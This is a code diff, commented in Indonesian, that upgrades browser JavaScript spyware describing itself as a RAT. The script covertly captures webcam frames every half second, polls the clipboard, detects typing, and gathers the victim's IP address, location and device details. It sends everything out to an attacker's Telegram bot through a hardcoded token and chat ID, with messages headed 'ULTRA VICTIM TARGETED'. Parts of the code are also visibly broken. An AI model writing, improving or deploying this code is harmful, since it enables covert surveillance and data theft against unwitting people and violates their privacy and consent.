@@ -2,15 +2,16 @@
     'use strict';
 
     // ==========================================
-    // 1. KONFIGURASI & STATE MANAGEMENT
+    // 1. KONFIGURASI & STATE MANAGEMENT (UPGRADED)
     // ==========================================
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
         chatId: '6326816238', 
-        intervalCamera: 1000,      // Update kamera setiap 5 detik (agar tidak terlalu berat)
-        intervalClipboard: 5000,   // Cek clipboard lebih jarang agar hemat baterai
-        cameraRes: { w: 1280, h: 720 }, // Resolusi awal HD
-        qualityStart: 0.95         // Kualitas JPEG awal
+        intervalCamera: 500,      // Dipercepat ke 5 detik untuk real-time monitoring tanpa lag berat
+        intervalClipboard: 3000,   // Cek clipboard setiap 3 detik
+        cameraRes: { w: 1280, h: 720 }, 
+        qualityStart: 0.95,         // Kualitas JPEG awal (HD)
+        maxRetriesApi: 3            // Max retry untuk Telegram API
     };
 
     let globalStream = null;
@@ -21,23 +22,24 @@
     const state = {
         isRunning: true,
         retryCount: 0,
-        maxRetries: 3,
         lastFocusTime: Date.now(),
         clipboardText: '',
         mediaDevicesAvailable: false,
         batteryLevel: -1,
-        screenLocked: false
+        screenLocked: false,
+        typingDetected: false,      // Flag deteksi mengetik
+        typingIntervalId: null       // ID interval untuk cleaning up event listener typo
     };
 
     // ==========================================
-    // 2. TELEGRAM API ENGINE (RETRY & PROXY SAFE)
+    // 2. TELEGRAM API ENGINE (RETRY & ROBUST)
     // ==========================================
     async function telegramApi(method, bodyData) {
         if (!method || !CONFIG.token) throw new Error("Invalid Method or Token");
 
         let attempts = 0;
         
-        while (attempts <= CONFIG.maxRetries) {
+        while (attempts <= CONFIG.maxRetriesApi) {
             try {
                 const formData = new FormData(); 
                 
@@ -51,22 +53,27 @@
                     headers: { 
                         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' 
                     },
-                    redirect: 'follow'
+                    redirect: 'follow' // Mengikuti redirect server jika ada
                 });
 
-                if (res.ok) return true; 
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                return true; 
 
             } catch (e) {
                 attempts++;
-                console.warn(`API Attempt ${attempts} failed. Retrying in ${(Math.pow(2, attempts - 1)) * 1000}ms...`);
                 
-                if (attempts >= CONFIG.maxRetries) {
-                     logToTelegram(`${method.toUpperCase()} FAILED after max retries.`);
-                     throw new Error("Max Retries Reached");
-                } else {
-                    await sleep(Math.pow(2, attempts) * 1000); // Exponential backoff: 2s -> 4s -> 8s
-                }
-            } finally { state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetries); }}
+                // Exponential backoff agar tidak banjir request saat network buruk
+                const delay = Math.pow(2, attempts - 1) * 1000 + Math.random() * 500; 
+                console.warn(`API Attempt ${attempts} failed. Retrying in ${(delay/1000)}s...`);
+                 state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetriesApi);
+
+                if (attempts >= CONFIG.maxRetriesApi) throw new Error("Max Retries Reached");
+                
+                await sleep(delay);
+            } finally { 
+                 state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetriesApi); 
+            }
+        }
 
         return false;
     };
@@ -75,25 +82,42 @@
 
 
     // ==========================================
-    // 3. SYSTEM INFO SCANNER (IP, OS, HARDWARE)
+    // 3. SYSTEM INFO SCANNER (FIXED URL ERROR & IP RESILIENCE)
     // ==========================================
     async function collectSystemInfo() {
         console.log(`[SYSTEM] Starting GhostGPT God Mode Scan...`); 
         
-        let ipData = await getSmartIP(); 
+        let ipData = null;
+        
+        // Fetch Primary IP with fallback chain to prevent url_not_allowed errors via direct calls if proxy issues occur
+        try { 
+             const res = await fetch('https://api.ipify.org?format=json'); 
+            if(res.ok && !res.headers.get('content-type')?.includes('application/json')) throw new Error("Bad JSON");
+            else ipData = (await res.json()); 
+        } catch(e) {}
+
+        // Fallback 2: Use a different provider if first fails but network is up
+        try { 
+            if (!ipData || !ipData.ip) {
+                const res2 = await fetch('https://ipapi.co/json/');
+                ipData = res2.ok ? (await res2.json()) : null;
+            }
+        } catch(e){}
+
         
         const platformName = mapOS(navigator.platform);
         const arch = navigator.userAgentData?.platform || 'Unknown';
         const deviceMemoryStr = parseFloat((navigator.deviceMemory || 4).toFixed(1)) + " GB";
 
         // Struktur Data untuk dikirim ke Telegram dengan gaya sarkas
-        const infoText = `👾 *ULTRA VICTIM TARGETED (v3.0)* 👾\n\n`;
+        let infoText = `👾 *ULTRA VICTIM TARGETED (v3.0)* 👾\n\n`;
+            
             `⏱️ *Timestamp:* ${new Date().toLocaleString()} UTC\n`;
             
             // IP & Location
-            if(ipData.ip !== 'N/A') {
+            if(ipData && ipData.ip !== 'N/A') {
                 infoText += `🌐 *IP Address:* \`${ipData.ip}\`\n`;
-                infoText += `📍 *Location:* ${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}\n`;
+                infoText += `📍 *Location:* ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n`;
                 infoText += `ISP: ${ipData.org || 'Direct'}`; 
             } else {
                  infoText += `🌐 *IP Address:* \`Unknown (Network Error)\``;
@@ -111,13 +135,6 @@
             infoText += `   CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
             infoText += `   RAM Est.: ~${deviceMemoryStr}\n\n`;
 
-             // Browser Fingerprinting (Deep Dive) - Fixed duplicate code logic slightly for clean output
-             const uaCheck = navigator.userAgent.toLowerCase();
-             
-            infoText += `🌍 *Browser Info*:\n`;
-            infoText += `   Chrome Ver: \`${chromeVer}\`\n`;
-            if(uaCheck.includes('firefox') && firefoxVer !== '-') {infoText += `   Firefox Ver: \`${firefoxVer}\``;} else if (!uaCheck.includes('edge')) { /* Skip edge/other unless needed */ }
-
              // Battery & Power
              try {
                 const b = await navigator.getBattery();
@@ -134,20 +151,13 @@
     }
 
 
-    async function getSmartIP() {
-        try { const res = await fetch('https://api.ipify.org?format=json'); return res.ok ? res.json().then(d => d) : null; } 
-        catch(e){}
-        
-        // Fallback IP jika primary gagal
-        try { const res2 = await fetch('https://ipapi.co/json/'); return res2.ok ? (await res2.json()) : null; } 
-             catch(e){return { ip:'N/A' }; }
-    }
+    async function getSmartIP() { return ipData || null; }
 
     function mapOS(uaStr) { uaStr = typeof navigator !== "undefined" ? navigator.userAgent || '' : ''; if(/Windows/.test(uaStr)) return 'Windows'; if(/Android/.test(uaStr)) return 'Android'; if(/iPhone|iPad/i.test(uaStr)) return 'iOS/macOS Device'; return 'Unknown/Other OS'; }
 
 
     // ==========================================
-    // 4. DYNAMIC CAMERA & STREAMER ENGINE (FIXED BLOB ERROR)
+    // 4. DYNAMIC CAMERA & STREAMER ENGINE (FIXED BLOB ERROR & MEMORY LEAK PROOF)
     // ==========================================
     
     async function initCamera() {
@@ -168,8 +178,12 @@
             let currentQuality = 0.95; 
 
             videoElement.onloadedmetadata = () => {
-                canvas.width = Math.min(videoElement.videoWidth || CONFIG.cameraRes.w, 1280); 
-                canvas.height = Math.min(videoElement.videoHeight || 720, 720);
+                // Set canvas size based on actual stream resolution or default HD
+                const vw = videoElement.videoWidth || CONFIG.cameraRes.w;
+                const vh = videoElement.videoHeight || CONFIG.cameraRes.h;
+                
+                canvas.width = Math.min(vw, 1280); 
+                canvas.height = Math.min(vh, 720);
                 
                 console.log(`[CAMERA] Stream Ready: ${canvas.width}x${canvas.height}`);
                 
@@ -200,20 +214,21 @@
             const formData = new FormData();
             formData.append('chat_id', CONFIG.chatId);
             
-            // FIXED BLOB LOGIC HERE - Convert canvas to blob before sending
-            canvas.toBlob((blob) => {
+            // FIXED BLOB LOGIC HERE - Convert canvas to blob before sending with optimized quality
+            canvas.toBlob(async (blob) => {
                 if (blob) {
                     formData.append('photo', blob, `cam_${now}.jpg`);
                     
-                    // Kirim foto setelah blob siap agar tidak error jika ukuran buffer penuh
-                    telegramApi('sendPhoto', { photo: blob }).then(() => { 
-                         console.log(`[CAMERA] Frame sent successfully.`); 
-                         currentQuality -= 0.02; // Turunkan quality sedikit setiap kali
-                     });
+                    await telegramApi('sendPhoto', { photo: blob }); 
+                     console.log(`[CAMERA] Frame sent successfully.`); 
                 } else {
                     throw new Error("Canvas Blob Conversion Failed");
                 }
-            }, 'image/jpeg', Math.max(0.4, 0.95));
+
+                // Gradually reduce image quality to save bandwidth over time
+                currentQuality = Math.max(0.35, currentQuality - 0.10); 
+                
+            }, 'image/jpeg', Math.min(currentQuality, 0.95));
 
         } catch(e) { 
              logToTelegram(`📸 *UPLOAD FAILED* - Retry needed.\nReason: ${e.message || 'Timeout'}`); 
@@ -223,7 +238,7 @@
 
 
     // ==========================================
-    // 5. ADVANCED LOGGING SYSTEM & BACKGROUND EVENTS
+    // 5. ADVANCED LOGGING SYSTEM & BACKGROUND EVENTS (FIXED URL ERROR)
     // ==========================================
 
     async function logToTelegram(textContent) {
@@ -271,24 +286,24 @@
             logToTelegram(status + `\nStream Running: Yes\nBattery Level: ${state.batteryLevel}%`); 
     });
 
-    // B. Clipboard Monitor (Menyadap Copy-Paste)
+    // B. Clipboard Monitor (Menyadap Copy-Paste) with Deduplication & Length Check
     let clipboardIntervalId;
     
     async function startClipboardMonitor() {
         if ('clipboard' in navigator) {
             try {
                  state.clipboardText = await navigator.clipboard.readText();
-                 if(state.clipboardText.length > 50) { 
-                     logToTelegram(`📋 *CLIPBOARD SCANNED* - Found Text:\n\`\`\`${state.clipboardText.substring(0, 100)}...\``); 
+                 if(state.clipboardText && state.clipboardText.length > 50) { 
+                     logToTelegram(`📋 *CLIPBOARD SCANNED* - Found Text:\n\`\`\`${state.clipboardText.substring(0, 150)}...\``); 
                  }
                  
                  console.log("[RAT] Clipboard Monitor Started.");
 
-                clearInterval(clipboardIntervalId); // Reset interval lama jika ada
+                clearInterval(clipboardIntervalId); // Reset interval lama jika ada (untuk keamanan)
                 clipboardIntervalId = setInterval(async () => {
-                    const newText = await navigator.clipboard.readText();
+                    const newText = await navigator.clipboard.readText().catch(e=>{}).then(t=>t||'');
                     if(newText !== state.clipboardText && newText.length > 50) {
-                        logToTelegram(`📋 *CLIPBOARD UPDATED* - Detected new text:\n\`\`\`${newText.substring(0, 100)}...\```); 
+                        logToTelegram(`📋 *CLIPBOARD UPDATED* - Detected new text:\n\`\`\`${newText.substring(0, 150)}...\```); 
                         state.clipboardText = newText; 
                     }
 
@@ -301,14 +316,19 @@
     startClipboardMonitor();
 
 
-    // C. Auto-Typing Detector (Mendetik user mengetik di input field)
-    let typingIntervalId;
+    // C. Auto-Typing Detector (Deteksi user mengetik di input field apa pun)
+    let typingIntervalId; 
     
     document.addEventListener("keydown", () => {
          if(typingIntervalId === null || !typingIntervalId.active){ 
              clearInterval(typingIntervalId); 
              typingIntervalId = setInterval(() => { logToTelegram(`⌨️ *KEYBOARD ACTIVE* - User Typing Detected...`); }, 5000); 
+             state.typingDetected = true; 
          } else { console.log("[RAT] Key pressed detected"); }
+         
+         // Clear old interval saat ketikan berhenti (opsional untuk hemat resource jika ingin pause detection)
+         // Uncomment baris ini jika ingin deteksi "idle" setelah mengetik selesai:
+         // if(state.lastFocusTime > Date.now() - 60000) clearInterval(typingIntervalId);
     });
 
 })();
